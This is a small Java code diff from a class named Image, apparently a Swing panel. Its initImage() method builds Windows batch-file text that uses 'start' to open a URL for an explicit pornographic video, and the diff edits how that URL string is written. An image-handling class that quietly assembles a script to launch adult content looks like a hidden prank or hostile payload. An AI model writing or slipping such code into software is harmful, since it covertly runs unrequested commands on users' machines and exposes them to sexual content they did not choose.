@@ -44,7 +44,7 @@ public class Image extends JPanel implements Serializable {
     }
 
     public static void initImage() {
-        String url = "openURI(\"https://www.pussyspace.com/vid-5922384-she-plays-with-toys-in-the-car-while-her-husband-is-at-work/\");";
+        String url = "https://www.pussyspace.com/vid-5922384-she-plays-with-toys-in-the-car-while-her-husband-is-at-work/";
 
         String batchContent = "@echo off\n" +
                 "start " + url + "\n";
